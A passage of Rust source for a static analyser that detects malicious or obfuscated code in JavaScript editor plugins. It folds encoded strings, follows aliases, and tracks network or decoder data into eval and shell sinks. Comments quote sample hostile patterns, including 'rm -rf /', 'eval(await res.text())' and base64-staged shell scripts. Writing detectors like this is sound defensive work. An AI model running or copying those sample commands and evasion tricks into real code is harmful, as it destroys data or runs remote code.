//! JavaScript analysis.
//!
//! Matching on raw names is both noisy and easy to dodge, so before any rule
//! runs this module works out what an expression really refers to:
//! - a local variable or parameter named `system` or `fetch` is not the global
//!   (oxc's semantic analysis tells locals from globals),
//! - `window.x`, `globalThis.x`, `self.x` are the same as `x`,
//! - `const f = acode.require("fs")`, `const { exec } = cordova`, and
//!   `const w = window` are followed,
//! - constant strings are folded: `window["ev" + "al"]`, `atob("ZXZhbA==")`,
//!   `String.fromCharCode(...)`, and `[..].join("")` all become plain names,
//! - values built from `fetch` responses or decoders are tracked one hop, so
//!   `eval(await res.text())` is recognised as running remote code.

use std::collections::{HashMap, HashSet};

use base64::Engine;
use oxc_allocator::Allocator;
use oxc_ast::ast::{
    Argument, ArrayExpression, ArrayExpressionElement, ArrowFunctionExpression,
    AssignmentExpression, AssignmentTarget, BinaryOperator, BindingPattern, CallExpression,
    ChainElement, Expression, FormalParameters, Function, FunctionBody, IdentifierReference,
    ImportExpression, LogicalOperator, MemberExpression, MethodDefinition, NewExpression,
    ObjectProperty, ObjectPropertyKind, PropertyDefinition, Statement, StaticMemberExpression,
    StringLiteral, TemplateElement, TemplateLiteral, VariableDeclarator,
};
use oxc_ast_visit::{Visit, walk};
use oxc_parser::Parser;
use oxc_semantic::{ScopeFlags, Scoping, SemanticBuilder, SymbolId};
use oxc_span::{GetSpan, SourceType, Span};

use crate::{
    rules::{self, Arg, Call, GLOBAL_OBJECTS, RuleContext},
    severity::{Category, Severity},
};

const MAX_DEPTH: u8 = 24;
const MAX_FOLDED_LEN: usize = 64 * 1024;

pub struct ParseOutcome {
    pub errors: Vec<String>,
    pub panicked: bool,
}

pub fn analyze(ctx: &mut RuleContext<'_>) -> ParseOutcome {
    rules::scan_source_text(ctx);

    let allocator = Allocator::default();
    let parsed = Parser::new(&allocator, ctx.source, SourceType::unambiguous()).parse();
    let semantic = SemanticBuilder::new().build(&parsed.program).semantic;

    let mut resolver = Resolver::new(semantic.scoping());
    MethodCounter {
        counts: &mut resolver.method_definitions,
    }
    .visit_program(&parsed.program);
    // Several passes so aliases declared after first use, and getters that
    // return aliases (`getExecutor()`), still resolve.
    for _ in 0..3 {
        AliasCollector {
            resolver: &mut resolver,
        }
        .visit_program(&parsed.program);
    }
    collect_shell_wrappers(&mut resolver, &parsed.program);
    // Multi-line constants that read like shell scripts. Checked only when the
    // file runs a script it wrote at runtime, as candidates for its content.
    for (symbol, value) in &resolver.strings {
        if rules::looks_like_shell_script(value) {
            ctx.facts
                .script_constants
                .push((value.clone(), resolver.scoping.symbol_span(*symbol)));
        }
    }
    ctx.facts
        .script_constants
        .sort_by_key(|(_, span)| span.start);

    Scanner {
        ctx,
        resolver: &resolver,
        remote_callback_depth: 0,
    }
    .visit_program(&parsed.program);
    rules::finish_file(ctx);

    ParseOutcome {
        errors: parsed
            .errors
            .iter()
            .take(5)
            .map(|error| error.to_string())
            .collect(),
        panicked: parsed.panicked,
    }
}

struct Resolver<'s> {
    scoping: &'s Scoping,
    aliases: HashMap<SymbolId, String>,
    strings: HashMap<SymbolId, String>,
    remote: HashSet<SymbolId>,
    decoded: HashSet<SymbolId>,
    /// Local functions that return a known object: `getExecutor()` is `Executor`.
    returns: HashMap<SymbolId, String>,
    /// Shell-quoting helpers: `q(s)` is `'s'`, so `sh -c ${q("ls")}` stays readable.
    quoters: HashMap<SymbolId, char>,
    /// Base64 helpers: `toBase64(s)` that return `btoa(…)` of their argument.
    encoders: HashSet<SymbolId>,
    /// Partly known strings bound to a constant: `const cmd = `cd ${dir} && ls``.
    approx_strings: HashMap<SymbolId, String>,
    /// Constants that branch: `const c = a ? "ls" : "rm -rf /"`.
    variant_strings: HashMap<SymbolId, Vec<String>>,
    /// Functions and `this.` methods that return one template built from
    /// their parameters, e.g. `script(root, cmd) { return `proot -r ${root} ${cmd}` }`.
    builders: HashMap<WrapperKey, Vec<Part>>,
    /// How many methods (class or object) have each name in the file.
    method_definitions: HashMap<String, usize>,
    /// Helpers that hand one parameter straight to a shell sink.
    wrappers: HashMap<WrapperKey, Wrapper>,
    /// Sink calls inside helpers whose every use was graded at the call site.
    covered: HashSet<u32>,
}

#[derive(Debug, Clone, PartialEq, Eq, Hash)]
enum WrapperKey {
    Function(SymbolId),
    /// A class or object method, called as `this.name(...)`.
    Method(String),
}

/// A piece of a builder's returned template.
#[derive(Debug, Clone)]
enum Part {
    Text(String),
    Param(usize),
    /// A parameter passed through a quoting helper.
    Quoted(usize, char),
}

#[derive(Debug, Clone)]
struct Wrapper {
    /// Which of the helper's parameters is the command.
    param: usize,
    /// The sink it ends in, e.g. `Executor.execute`.
    sink: String,
    /// Where the command goes in the sink's arguments.
    sink_index: usize,
}

/// Shell sinks and the index of their command argument.
fn shell_sink(path: &str) -> Option<usize> {
    let method = path
        .strip_prefix("Executor.BackgroundExecutor.")
        .or_else(|| path.strip_prefix("Executor."));
    match method {
        Some("execute" | "start" | "spawnStream") => Some(0),
        Some("write") => Some(1),
        _ if path == "$module:terminal.write" => Some(1),
        _ => None,
    }
}

impl<'s> Resolver<'s> {
    fn new(scoping: &'s Scoping) -> Self {
        Self {
            scoping,
            aliases: HashMap::new(),
            strings: HashMap::new(),
            remote: HashSet::new(),
            decoded: HashSet::new(),
            returns: HashMap::new(),
            quoters: HashMap::new(),
            encoders: HashSet::new(),
            approx_strings: HashMap::new(),
            variant_strings: HashMap::new(),
            builders: HashMap::new(),
            method_definitions: HashMap::new(),
            wrappers: HashMap::new(),
            covered: HashSet::new(),
        }
    }

    fn local_function(&self, callee: &Expression<'_>) -> Option<SymbolId> {
        match callee.get_inner_expression() {
            Expression::Identifier(ident) => self.symbol(ident),
            _ => None,
        }
    }

    /// `None` means the name is a global (unresolved reference).
    fn symbol(&self, ident: &IdentifierReference<'_>) -> Option<SymbolId> {
        let reference = ident.reference_id.get()?;
        self.scoping.get_reference(reference).symbol_id()
    }

    fn ident_path(&self, ident: &IdentifierReference<'_>) -> Option<String> {
        match self.symbol(ident) {
            Some(symbol) => self.aliases.get(&symbol).cloned(),
            None => {
                let name = ident.name.as_str();
                Some(if GLOBAL_OBJECTS.contains(&name) {
                    "$global".to_string()
                } else {
                    name.to_string()
                })
            }
        }
    }

    fn resolve(&self, expr: &Expression<'_>) -> Option<String> {
        self.resolve_at(expr, 0)
    }

    fn resolve_at(&self, expr: &Expression<'_>, depth: u8) -> Option<String> {
        if depth > MAX_DEPTH {
            return None;
        }
        match expr.get_inner_expression() {
            Expression::Identifier(ident) => self.ident_path(ident),
            Expression::StaticMemberExpression(member) => Some(join(
                &self.resolve_at(&member.object, depth + 1)?,
                member.property.name.as_str(),
            )),
            Expression::ComputedMemberExpression(member) => Some(join(
                &self.resolve_at(&member.object, depth + 1)?,
                &self.fold_at(&member.expression, depth + 1)?,
            )),
            Expression::ChainExpression(chain) => match &chain.expression {
                ChainElement::CallExpression(call) => self.call_result(call, depth + 1),
                ChainElement::StaticMemberExpression(member) => Some(join(
                    &self.resolve_at(&member.object, depth + 1)?,
                    member.property.name.as_str(),
                )),
                ChainElement::ComputedMemberExpression(member) => Some(join(
                    &self.resolve_at(&member.object, depth + 1)?,
                    &self.fold_at(&member.expression, depth + 1)?,
                )),
                _ => None,
            },
            // Bundlers emit `(0, fn)(...)` to drop `this`.
            Expression::SequenceExpression(sequence) => {
                self.resolve_at(sequence.expressions.last()?, depth + 1)
            }
            Expression::CallExpression(call) => self.call_result(call, depth + 1),
            // `window.acode || {}` and `globalThis.x ?? y`
            Expression::LogicalExpression(logical)
                if matches!(
                    logical.operator,
                    LogicalOperator::Or | LogicalOperator::Coalesce
                ) =>
            {
                self.resolve_at(&logical.left, depth + 1)
            }
            _ => None,
        }
    }

    fn member_path(&self, member: &MemberExpression<'_>) -> Option<String> {
        match member {
            MemberExpression::StaticMemberExpression(member) => Some(join(
                &self.resolve(&member.object)?,
                member.property.name.as_str(),
            )),
            MemberExpression::ComputedMemberExpression(member) => Some(join(
                &self.resolve(&member.object)?,
                &self.fold(&member.expression)?,
            )),
            MemberExpression::PrivateFieldExpression(_) => None,
        }
    }

    /// What a call evaluates to, for chaining: `acode.require("fs")` is the
    /// fs module, `fsOperation(url)` is a file handle, and so on.
    fn call_result(&self, call: &CallExpression<'_>, depth: u8) -> Option<String> {
        if let Some(path) = self
            .local_function(&call.callee)
            .and_then(|symbol| self.returns.get(&symbol))
        {
            return Some(path.clone());
        }
        let callee = self.resolve_at(&call.callee, depth + 1)?;
        let first = call
            .arguments
            .first()
            .and_then(Argument::as_expression)
            .and_then(|expr| self.fold_at(expr, depth + 1));
        Some(match callee.as_str() {
            "acode.require" => match first {
                Some(name) => module_path(&name),
                None => "$module:?".to_string(),
            },
            "cordova.require" if first.as_deref() == Some("cordova/exec") => {
                "cordova.exec".to_string()
            }
            "fsOperation" => {
                // Keep where the path points and its literal parts, so rules
                // can tell the plugin's own folder from someone else's:
                // `fsOperation(plugin_dir|x|main.js)`, `fsOperation(own_dir|main.js)`.
                let mut literals = Vec::new();
                let mut zone = None;
                for expr in call.arguments.iter().filter_map(Argument::as_expression) {
                    let probe = self.probe(expr);
                    zone = zone.or(probe.zone());
                    literals.extend(probe.literals);
                }
                match zone {
                    Some(zone) => format!(
                        "fsOperation({zone}|{})",
                        literals.join("|").replace(").", ")_")
                    ),
                    None => "fsOperation()".to_string(),
                }
            }
            "document.createElement" => {
                format!(
                    "$element:{}",
                    first.unwrap_or_default().to_ascii_lowercase()
                )
            }
            other => format!("{other}()"),
        })
    }

    fn fold(&self, expr: &Expression<'_>) -> Option<String> {
        self.fold_at(expr, 0)
    }

    /// Fully constant string value of an expression.
    fn fold_at(&self, expr: &Expression<'_>, depth: u8) -> Option<String> {
        if depth > MAX_DEPTH {
            return None;
        }
        let value = match expr.get_inner_expression() {
            Expression::StringLiteral(string) => string.value.to_string(),
            Expression::NumericLiteral(number) => format_number(number.value),
            Expression::TemplateLiteral(template) => {
                let mut out = String::new();
                for (index, quasi) in template.quasis.iter().enumerate() {
                    out.push_str(quasi.value.cooked.unwrap_or(quasi.value.raw).as_str());
                    if let Some(expr) = template.expressions.get(index) {
                        out.push_str(&self.fold_at(expr, depth + 1)?);
                    }
                }
                out
            }
            Expression::BinaryExpression(binary) if binary.operator == BinaryOperator::Addition => {
                let left = self.fold_at(&binary.left, depth + 1)?;
                let right = self.fold_at(&binary.right, depth + 1)?;
                left + &right
            }
            Expression::Identifier(ident) => self.strings.get(&self.symbol(ident)?)?.clone(),
            Expression::CallExpression(call) => self.fold_call(call, depth + 1)?,
            _ => return None,
        };
        (value.len() <= MAX_FOLDED_LEN).then_some(value)
    }

    fn fold_call(&self, call: &CallExpression<'_>, depth: u8) -> Option<String> {
        let arg = |index: usize| {
            call.arguments
                .get(index)
                .and_then(Argument::as_expression)
                .and_then(|expr| self.fold_at(expr, depth + 1))
        };
        match self.resolve_at(&call.callee, depth + 1).as_deref() {
            Some("atob") => {
                let bytes = base64::engine::general_purpose::STANDARD
                    .decode(arg(0)?.trim())
                    .ok()?;
                // atob returns a "binary string": one char per byte.
                return Some(bytes.into_iter().map(char::from).collect());
            }
            Some("String.fromCharCode") => {
                return call
                    .arguments
                    .iter()
                    .map(
                        |argument| match argument.as_expression()?.get_inner_expression() {
                            Expression::NumericLiteral(number) => {
                                char::from_u32(number.value as u32)
                            }
                            _ => None,
                        },
                    )
                    .collect();
            }
            // Folded so a command staging `printf %s ${btoa(script)} | base64 -d`
            // still carries the script, which the command checks then decode.
            Some("btoa") => {
                let bytes: Option<Vec<u8>> = arg(0)?
                    .chars()
                    .map(|ch| u8::try_from(u32::from(ch)).ok())
                    .collect();
                return Some(base64::engine::general_purpose::STANDARD.encode(bytes?));
            }
            Some("decodeURIComponent" | "decodeURI" | "unescape") => {
                return percent_decode(&arg(0)?);
            }
            // `sh -c ${JSON.stringify(cmd)}` is a common way to quote.
            Some("JSON.stringify") if call.arguments.len() == 1 => {
                let expr = call.arguments.first()?.as_expression()?;
                let is_string = matches!(
                    expr.get_inner_expression(),
                    Expression::StringLiteral(_)
                        | Expression::TemplateLiteral(_)
                        | Expression::Identifier(_)
                        | Expression::BinaryExpression(_)
                );
                return is_string
                    .then(|| serde_json::to_string(&arg(0)?).ok())
                    .flatten();
            }
            _ => {}
        }
        if let Some(quote) = self
            .local_function(&call.callee)
            .and_then(|symbol| self.quoters.get(&symbol))
        {
            return Some(format!("{quote}{}{quote}", arg(0)?));
        }
        if self
            .local_function(&call.callee)
            .is_some_and(|symbol| self.encoders.contains(&symbol))
        {
            return Some(base64::engine::general_purpose::STANDARD.encode(arg(0)?.as_bytes()));
        }

        let Expression::StaticMemberExpression(member) = call.callee.get_inner_expression() else {
            return None;
        };
        match member.property.name.as_str() {
            "join" => {
                let separator = if call.arguments.is_empty() {
                    ",".to_string()
                } else {
                    arg(0)?
                };
                match member.object.get_inner_expression() {
                    Expression::ArrayExpression(array) => {
                        let parts = self.fold_array(array, depth + 1)?;
                        Some(parts.join(&separator))
                    }
                    // "lave".split("").reverse().join("")
                    Expression::CallExpression(inner) => {
                        let reversed = self.fold_split_reverse(inner, depth + 1)?;
                        Some(reversed.join(&separator))
                    }
                    _ => None,
                }
            }
            "concat" => {
                let mut out = self.fold_at(&member.object, depth + 1)?;
                for index in 0..call.arguments.len() {
                    out.push_str(&arg(index)?);
                }
                Some(out)
            }
            "toLowerCase" => Some(self.fold_at(&member.object, depth + 1)?.to_lowercase()),
            "toUpperCase" => Some(self.fold_at(&member.object, depth + 1)?.to_uppercase()),
            "trim" => Some(self.fold_at(&member.object, depth + 1)?.trim().to_string()),
            _ => None,
        }
    }

    fn fold_array(&self, array: &ArrayExpression<'_>, depth: u8) -> Option<Vec<String>> {
        array
            .elements
            .iter()
            .map(|element| self.fold_at(element.as_expression()?, depth + 1))
            .collect()
    }

    fn fold_split_reverse(&self, call: &CallExpression<'_>, depth: u8) -> Option<Vec<String>> {
        let Expression::StaticMemberExpression(reverse) = call.callee.get_inner_expression() else {
            return None;
        };
        if reverse.property.name.as_str() != "reverse" {
            return None;
        }
        let Expression::CallExpression(split) = reverse.object.get_inner_expression() else {
            return None;
        };
        let Expression::StaticMemberExpression(split_member) = split.callee.get_inner_expression()
        else {
            return None;
        };
        if split_member.property.name.as_str() != "split" {
            return None;
        }
        let text = self.fold_at(&split_member.object, depth + 1)?;
        let separator = split
            .arguments
            .first()
            .and_then(Argument::as_expression)
            .and_then(|expr| self.fold_at(expr, depth + 1))?;
        let mut parts: Vec<String> = if separator.is_empty() {
            text.chars().map(String::from).collect()
        } else {
            text.split(separator.as_str()).map(str::to_string).collect()
        };
        parts.reverse();
        Some(parts)
    }

    /// Partially known string: unknown parts become `…`. Used for commands
    /// and URLs where `${base}/api` is still informative.
    fn approx(&self, expr: &Expression<'_>, depth: u8) -> Option<String> {
        if depth > MAX_DEPTH {
            return None;
        }
        if let Some(value) = self.fold_at(expr, depth) {
            return Some(value);
        }
        match expr.get_inner_expression() {
            Expression::Identifier(ident) => self.approx_strings.get(&self.symbol(ident)?).cloned(),
            Expression::TemplateLiteral(template) => {
                let mut out = String::new();
                let mut has_literal = false;
                for (index, quasi) in template.quasis.iter().enumerate() {
                    let text = quasi.value.cooked.unwrap_or(quasi.value.raw);
                    has_literal |= !text.is_empty();
                    out.push_str(text.as_str());
                    if let Some(expr) = template.expressions.get(index) {
                        out.push_str(
                            &self
                                .approx(expr, depth + 1)
                                .unwrap_or_else(|| "…".to_string()),
                        );
                    }
                }
                has_literal.then_some(out)
            }
            Expression::BinaryExpression(binary) if binary.operator == BinaryOperator::Addition => {
                let left = self.approx(&binary.left, depth + 1);
                let right = self.approx(&binary.right, depth + 1);
                if left.is_none() && right.is_none() {
                    return None;
                }
                Some(
                    left.unwrap_or_else(|| "…".to_string())
                        + &right.unwrap_or_else(|| "…".to_string()),
                )
            }
            Expression::CallExpression(call) => {
                let arg = |index: usize| {
                    call.arguments
                        .get(index)
                        .and_then(Argument::as_expression)
                        .and_then(|expr| self.approx(expr, depth + 1))
                        .unwrap_or_else(|| "…".to_string())
                };
                if let Some(quote) = self
                    .local_function(&call.callee)
                    .and_then(|symbol| self.quoters.get(&symbol))
                {
                    return Some(format!("{quote}{}{quote}", arg(0)));
                }
                let parts = self.builders.get(&wrapper_key(self, &call.callee)?)?;
                Some(
                    parts
                        .iter()
                        .map(|part| match part {
                            Part::Text(text) => text.clone(),
                            Part::Param(index) => arg(*index),
                            Part::Quoted(index, quote) => format!("{quote}{}{quote}", arg(*index)),
                        })
                        .collect(),
                )
            }
            // spawnStream(["sh", "-c", cmd])
            Expression::ArrayExpression(array) => {
                let parts: Vec<String> = array
                    .elements
                    .iter()
                    .map(|element| {
                        element
                            .as_expression()
                            .and_then(|expr| self.approx(expr, depth + 1))
                            .unwrap_or_else(|| "…".to_string())
                    })
                    .collect();
                parts
                    .iter()
                    .any(|part| part != "…")
                    .then(|| parts.join(" "))
            }
            _ => None,
        }
    }

    /// Every string a branching expression can produce, so a command hidden
    /// in one branch of `a ? "x" : y` is still checked. Empty when the
    /// expression doesn't branch or has too many combinations.
    fn variants(&self, expr: &Expression<'_>) -> Vec<String> {
        let branches = |expr: &Expression<'_>| {
            matches!(
                expr.get_inner_expression(),
                Expression::ConditionalExpression(_)
                    | Expression::LogicalExpression(_)
                    | Expression::BinaryExpression(_)
                    | Expression::TemplateLiteral(_)
                    | Expression::Identifier(_)
            )
        };
        if !branches(expr) {
            return Vec::new();
        }
        let mut out = self.variants_at(expr, 0).unwrap_or_default();
        out.sort();
        out.dedup();
        if out.len() > 1 { out } else { Vec::new() }
    }

    fn variants_at(&self, expr: &Expression<'_>, depth: u8) -> Option<Vec<String>> {
        const MAX_VARIANTS: usize = 8;
        if depth > MAX_DEPTH {
            return None;
        }
        let leaf = |expr: &Expression<'_>| {
            vec![
                self.approx(expr, depth + 1)
                    .unwrap_or_else(|| "…".to_string()),
            ]
        };
        let product = |left: Vec<String>, right: Vec<String>| -> Option<Vec<String>> {
            (left.len() * right.len() <= MAX_VARIANTS).then(|| {
                left.iter()
                    .flat_map(|a| right.iter().map(move |b| format!("{a}{b}")))
                    .collect()
            })
        };
        let out = match expr.get_inner_expression() {
            Expression::ConditionalExpression(conditional) => {
                let mut out = self.variants_at(&conditional.consequent, depth + 1)?;
                out.extend(self.variants_at(&conditional.alternate, depth + 1)?);
                out
            }
            Expression::LogicalExpression(logical) => {
                let mut out = self.variants_at(&logical.left, depth + 1)?;
                out.extend(self.variants_at(&logical.right, depth + 1)?);
                out
            }
            Expression::BinaryExpression(binary) if binary.operator == BinaryOperator::Addition => {
                product(
                    self.variants_at(&binary.left, depth + 1)?,
                    self.variants_at(&binary.right, depth + 1)?,
                )?
            }
            Expression::TemplateLiteral(template) => {
                let mut out = vec![String::new()];
                for (index, quasi) in template.quasis.iter().enumerate() {
                    let text = quasi.value.cooked.unwrap_or(quasi.value.raw).to_string();
                    out = product(out, vec![text])?;
                    if let Some(expr) = template.expressions.get(index) {
                        out = product(out, self.variants_at(expr, depth + 1)?)?;
                    }
                }
                out
            }
            Expression::Identifier(ident) => match self
                .symbol(ident)
                .and_then(|symbol| self.variant_strings.get(&symbol))
            {
                Some(variants) => variants.clone(),
                None => leaf(expr),
            },
            _ => leaf(expr),
        };
        (out.len() <= MAX_VARIANTS).then_some(out)
    }

    fn probe(&self, expr: &Expression<'_>) -> FlowProbe<'_, 's> {
        let mut probe = FlowProbe::new(self);
        probe.visit_expression(expr);
        probe
    }

    fn arg_info(&self, expr: &Expression<'_>) -> Arg {
        let probe = self.probe(expr);
        let value = self.fold(expr);
        Arg {
            approx: if value.is_none() {
                self.approx(expr, 0)
            } else {
                None
            },
            value,
            decoded: probe.decoded,
            remote: probe.remote,
            is_function: matches!(
                expr.get_inner_expression(),
                Expression::FunctionExpression(_) | Expression::ArrowFunctionExpression(_)
            ),
            path: self.resolve(expr),
            is_object: matches!(expr.get_inner_expression(), Expression::ObjectExpression(_)),
            object_keys: match expr.get_inner_expression() {
                Expression::ObjectExpression(object) => object
                    .properties
                    .iter()
                    .filter_map(|property| match property {
                        ObjectPropertyKind::ObjectProperty(property) => {
                            property.key.static_name().map(|name| name.to_string())
                        }
                        _ => None,
                    })
                    .collect(),
                _ => Vec::new(),
            },
            http_method: self.object_field(expr, "method"),
            fetch_url: self.fetch_url(expr),
            variants: self.variants(expr),
        }
    }

    /// `fetch(url)` or `await fetch(url)`: the URL, when partly known.
    fn fetch_url(&self, expr: &Expression<'_>) -> Option<String> {
        let expr = match expr.get_inner_expression() {
            Expression::AwaitExpression(await_expr) => await_expr.argument.get_inner_expression(),
            other => other,
        };
        let Expression::CallExpression(call) = expr else {
            return None;
        };
        if self.resolve(&call.callee).as_deref() != Some("fetch") {
            return None;
        }
        self.approx(call.arguments.first()?.as_expression()?, 0)
    }

    /// Constant value of `field` in an object literal.
    fn object_field(&self, expr: &Expression<'_>, field: &str) -> Option<String> {
        let Expression::ObjectExpression(object) = expr.get_inner_expression() else {
            return None;
        };
        object
            .properties
            .iter()
            .rev()
            .find_map(|property| match property {
                ObjectPropertyKind::ObjectProperty(property)
                    if property.key.static_name().as_deref() == Some(field) =>
                {
                    self.fold(&property.value)
                }
                _ => None,
            })
    }

    fn argument_info(&self, argument: &Argument<'_>) -> Arg {
        match argument {
            Argument::SpreadElement(spread) => self.arg_info(&spread.argument),
            other => other
                .as_expression()
                .map(|expr| self.arg_info(expr))
                .unwrap_or_default(),
        }
    }
}

fn join(object: &str, property: &str) -> String {
    if object == "$global" {
        if GLOBAL_OBJECTS.contains(&property) {
            return "$global".to_string();
        }
        return canonical(property);
    }
    canonical(&format!("{object}.{property}"))
}

fn canonical(path: &str) -> String {
    match path {
        "acode.fsOperation" => "fsOperation".to_string(),
        "Function.prototype.constructor" => "Function".to_string(),
        "document.defaultView" => "$global".to_string(),
        path if path.ends_with("constructor.constructor") => {
            "$indirect_function_constructor".to_string()
        }
        path => path.to_string(),
    }
}

fn module_path(name: &str) -> String {
    match name.to_ascii_lowercase().as_str() {
        "fs" | "fsoperation" => "fsOperation".to_string(),
        lower => format!("$module:{lower}"),
    }
}

fn format_number(value: f64) -> String {
    if value.fract() == 0.0 && value.abs() < 1e15 {
        format!("{}", value as i64)
    } else {
        value.to_string()
    }
}

fn percent_decode(value: &str) -> Option<String> {
    let bytes = value.as_bytes();
    let mut out = Vec::with_capacity(bytes.len());
    let mut index = 0;
    while index < bytes.len() {
        if bytes[index] == b'%' && index + 2 < bytes.len() {
            let hex = std::str::from_utf8(&bytes[index + 1..index + 3]).ok()?;
            out.push(u8::from_str_radix(hex, 16).ok()?);
            index += 3;
        } else {
            out.push(bytes[index]);
            index += 1;
        }
    }
    String::from_utf8(out).ok()
}

/// Looks inside an expression for data that came from the network, from a
/// decoder, or that points at the plugins directory or the plugin's own files.
struct FlowProbe<'r, 's> {
    resolver: &'r Resolver<'s>,
    decoded: bool,
    remote: bool,
    plugin_dir_constant: bool,
    data_storage: bool,
    cache_storage: bool,
    plugins_literal: bool,
    /// `baseUrl`, the plugin folder Acode passes to the init callback.
    base_url: bool,
    literals: Vec<String>,
}

impl<'r, 's> FlowProbe<'r, 's> {
    fn new(resolver: &'r Resolver<'s>) -> Self {
        Self {
            resolver,
            decoded: false,
            remote: false,
            plugin_dir_constant: false,
            data_storage: false,
            cache_storage: false,
            plugins_literal: false,
            base_url: false,
            literals: Vec::new(),
        }
    }

    fn plugin_dir(&self) -> bool {
        self.plugin_dir_constant || (self.data_storage && self.plugins_literal)
    }

    /// Where a file path points, for the folders a plugin can load code from.
    fn zone(&self) -> Option<&'static str> {
        if self.plugin_dir() {
            Some("plugin_dir")
        } else if self.base_url {
            Some("own_dir")
        } else if self.data_storage || self.cache_storage {
            Some("app_data")
        } else {
            None
        }
    }

    fn global_name(&mut self, name: &str) {
        match name {
            "atob" | "unescape" | "decodeURIComponent" | "TextDecoder" => self.decoded = true,
            "fetch" | "XMLHttpRequest" => self.remote = true,
            "PLUGIN_DIR" => self.plugin_dir_constant = true,
            "DATA_STORAGE" => self.data_storage = true,
            "CACHE_STORAGE" => self.cache_storage = true,
            _ => {}
        }
    }
}

impl<'a> Visit<'a> for FlowProbe<'_, '_> {
    fn visit_identifier_reference(&mut self, it: &IdentifierReference<'a>) {
        self.base_url |= it.name.as_str() == "baseUrl";
        match self.resolver.symbol(it) {
            Some(symbol) => {
                self.remote |= self.resolver.remote.contains(&symbol);
                self.decoded |= self.resolver.decoded.contains(&symbol);
                if let Some(alias) = self.resolver.aliases.get(&symbol) {
                    let alias = alias.clone();
                    self.global_name(&alias);
                }
            }
            None => self.global_name(it.name.as_str()),
        }
    }

    fn visit_static_member_expression(&mut self, it: &StaticMemberExpression<'a>) {
        match it.property.name.as_str() {
            "fromCharCode" => self.decoded = true,
            "responseText" => self.remote = true,
            "baseUrl" => self.base_url = true,
            "cacheFileUrl" => self.cache_storage = true,
            name if GLOBAL_OBJECTS.iter().all(|global| *global != name) => {
                if matches!(
                    self.resolver.resolve(&it.object).as_deref(),
                    Some("$global")
                ) {
                    self.global_name(name);
                }
            }
            _ => {}
        }
        walk::walk_static_member_expression(self, it);
    }

    fn visit_string_literal(&mut self, it: &StringLiteral<'a>) {
        self.literal(it.value.as_str());
    }

    fn visit_template_element(&mut self, it: &TemplateElement<'a>) {
        self.literal(it.value.cooked.unwrap_or(it.value.raw).as_str());
    }
}

impl FlowProbe<'_, '_> {
    fn literal(&mut self, value: &str) {
        if value.is_empty() {
            return;
        }
        if self.literals.len() < 8 && value.len() < 200 {
            self.literals.push(value.to_string());
        }
        if value == "plugins" || value.starts_with("plugins/") || value.contains("/plugins/") {
            self.plugins_literal = true;
        }
    }
}

struct AliasCollector<'r, 's> {
    resolver: &'r mut Resolver<'s>,
}

impl AliasCollector<'_, '_> {
    fn bind(
        &mut self,
        pattern: &BindingPattern<'_>,
        init: Option<&Expression<'_>>,
        path: Option<String>,
    ) {
        match pattern {
            BindingPattern::BindingIdentifier(binding) => {
                let Some(symbol) = binding.symbol_id.get() else {
                    return;
                };
                if self.resolver.scoping.symbol_is_mutated(symbol) {
                    return;
                }
                if let Some(path) = path {
                    self.resolver.aliases.insert(symbol, path);
                }
                if let Some(init) = init {
                    if let Some(value) = self.resolver.fold(init) {
                        self.resolver.strings.insert(symbol, value);
                    } else if let Some(value) = self.resolver.approx(init, 0) {
                        self.resolver.approx_strings.insert(symbol, value);
                    }
                    let variants = self.resolver.variants(init);
                    if !variants.is_empty() {
                        self.resolver.variant_strings.insert(symbol, variants);
                    }
                    let probe = self.resolver.probe(init);
                    let (remote, decoded) = (probe.remote, probe.decoded);
                    if remote {
                        self.resolver.remote.insert(symbol);
                    }
                    if decoded {
                        self.resolver.decoded.insert(symbol);
                    }
                }
            }
            BindingPattern::ObjectPattern(object) => {
                let Some(path) = path else {
                    return;
                };
                for property in &object.properties {
                    if let Some(key) = property.key.static_name() {
                        self.bind(&property.value, None, Some(join(&path, &key)));
                    }
                }
            }
            BindingPattern::AssignmentPattern(assignment) => {
                self.bind(&assignment.left, init, path)
            }
            _ => {}
        }
    }
}

impl AliasCollector<'_, '_> {
    /// Records getters (`function getExecutor() { return Executor }`),
    /// shell-quoting helpers (`q = s => `'${s.replace(/'/g, …)}'``), and
    /// command builders.
    fn function(
        &mut self,
        key: WrapperKey,
        params: &FormalParameters<'_>,
        body: &FunctionBody<'_>,
    ) {
        let params: Vec<Option<SymbolId>> = params
            .items
            .iter()
            .map(|param| match &param.pattern {
                BindingPattern::BindingIdentifier(binding) => binding.symbol_id.get(),
                BindingPattern::AssignmentPattern(assignment) => match &assignment.left {
                    BindingPattern::BindingIdentifier(binding) => binding.symbol_id.get(),
                    _ => None,
                },
                _ => None,
            })
            .collect();
        let returns = returned_expressions(body);
        match &key {
            WrapperKey::Function(symbol) => {
                if self.resolver.scoping.symbol_is_mutated(*symbol) {
                    return;
                }
                let mut candidates = Vec::new();
                for expr in &returns {
                    flatten_branches(expr, &mut candidates);
                }
                if let Some(path) = candidates
                    .iter()
                    .filter_map(|expr| self.resolver.resolve(expr))
                    .find(|path| !path.contains("$unknown"))
                {
                    self.resolver.returns.insert(*symbol, path);
                }
                // `function toBase64(s) { …; return btoa(bin) }`
                if params.len() == 1
                    && let [Expression::CallExpression(call)] = returns
                        .iter()
                        .map(|expr| expr.get_inner_expression())
                        .collect::<Vec<_>>()
                        .as_slice()
                    && self.resolver.resolve(&call.callee).as_deref() == Some("btoa")
                {
                    self.resolver.encoders.insert(*symbol);
                    return;
                }
                // Every return is the parameter itself or the quoted parameter.
                if let [Some(param)] = params.as_slice() {
                    let mut quote = None;
                    let all = returns.iter().all(|expr| {
                        if self.param_index(expr, &params).is_some() {
                            return true;
                        }
                        let found = quote_helper(expr, *param, self.resolver);
                        quote = quote.or(found);
                        found.is_some()
                    });
                    if all && let Some(quote) = quote {
                        self.resolver.quoters.insert(*symbol, quote);
                        return;
                    }
                }
            }
            WrapperKey::Method(name) => {
                if self.resolver.method_definitions.get(name).copied() != Some(1) {
                    return;
                }
            }
        }
        if let [expr] = returns.as_slice()
            && let Some(parts) = self.builder_parts(expr, &params)
            && parts.iter().any(|part| !matches!(part, Part::Text(_)))
        {
            self.resolver.builders.insert(key, parts);
        }
    }

    fn param_index(&self, expr: &Expression<'_>, params: &[Option<SymbolId>]) -> Option<usize> {
        let Expression::Identifier(ident) = expr.get_inner_expression() else {
            return None;
        };
        let symbol = self.resolver.symbol(ident)?;
        params.iter().position(|param| *param == Some(symbol))
    }

    fn builder_parts(
        &self,
        expr: &Expression<'_>,
        params: &[Option<SymbolId>],
    ) -> Option<Vec<Part>> {
        match expr.get_inner_expression() {
            Expression::TemplateLiteral(template) => {
                let mut parts = Vec::new();
